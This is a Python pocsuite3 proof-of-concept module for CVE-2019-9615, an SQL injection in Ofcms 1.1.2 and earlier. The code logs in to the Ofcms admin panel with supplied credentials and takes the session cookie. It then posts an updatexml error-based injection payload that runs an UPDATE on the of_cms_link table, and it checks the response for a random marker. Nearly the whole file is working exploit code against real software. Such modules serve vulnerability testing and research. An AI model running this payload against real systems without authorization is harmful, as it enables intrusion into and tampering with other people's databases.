# encoding: utf-8
# Author    : Sma11stu
# Datetime  : 2021/3/21 10:01
# Product   : PyCharm
# Project   : pocsuite3
# File      : Ofcms_1_1_2_sql.py
# explain   : 文件说明

import re
import json
from collections import OrderedDict
from urllib.parse import urljoin
from requests.cookies import RequestsCookieJar
from pocsuite3.api import Output, POCBase, register_poc, requests, logger, POC_CATEGORY, OptDict, VUL_TYPE
from pocsuite3.lib.utils import random_str
from pocsuite3.lib.core.interpreter_option import OptString

class DemoPOC(POCBase):
    vulID = 'xxx'  # ssvid
    version = '3.0'
    author = ['seebug']
    vulDate = '2021-03-21'
    createDate = '2021-03-21'
    updateDate = '2021-03-21'
    references = ['https://lanvnal.com/2020/03/15/ofcms-cve-2019-9615-fu-xian/']
    name = 'Ofcms<=1.1.2 Sql注入漏洞-CVE-2019-9615'
    appPowerLink = ''
    appName = 'Ofcms'
    appVersion = '< 1.1.2'
    vulType = VUL_TYPE.SQL_INJECTION
    desc = '''
        Ofcms<=1.1.2 Sql注入漏洞-CVE-2019-9615
    '''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _options(self):
        o = OrderedDict()
        o["username"] = OptString('', description='这个poc需要用户登录，请输入登录账号', require=True)
        o["password"] = OptString('', description='这个poc需要用户密码，请输入用户密码', require=True)
        return o

    def login(self):
        login_url = urljoin(self.url, '/ofcms-admin/admin/dologin.json')
        post_data = {
            "username": self.get_option("username"),
            "password": self.get_option("password")
        }
        headers = {
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        }
        try:
            resp = requests.post(login_url, data=json.dumps(post_data))
            if resp.status_code == 200 and json.loads(resp.text)['code'] == '200':
                cookies =  requests.utils.dict_from_cookiejar(resp.cookies)
                cookie = "JSESSIONID="+cookies["JSESSIONID"]
                logger.info("获得的Cookie为：%s" % cookie)
                logger.info("Ofcms系统登录成功")
            else:
                logger.info("Ofcms系统登录失败，报错为 %s " % str(resp.text))
        except Exception as e:
            logger.warn(e)
            logger.warn("Ofcms系统登录失败")
        return cookie

    def _verify(self):
        result = {}
        cookies = self.login()
        random_uri = random_str(16)
        logger.info("random_uri为：%s" % random_uri)
        verify_payload = "update of_cms_link set link_name=updatexml(1,concat(0x7e,('" + random_uri + "'),0x7e),0) where link_id=4"
        post_data = {
            "sql" : verify_payload
        }
        veri_url = urljoin(self.url, '/ofcms-admin/admin/system/generate/create.json?sqlid=')
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            "Cookie": cookies
        }
        logger.info("Headres如下：")
        logger.info(headers)
        try:
            resp = requests.post(veri_url,data=post_data,headers=headers)
            flag = "~" + random_uri + "~"
            if flag in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = veri_url
                result['VerifyInfo']['Payload'] = verify_payload
        except Exception as e:
            logger.warn(str(e))
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
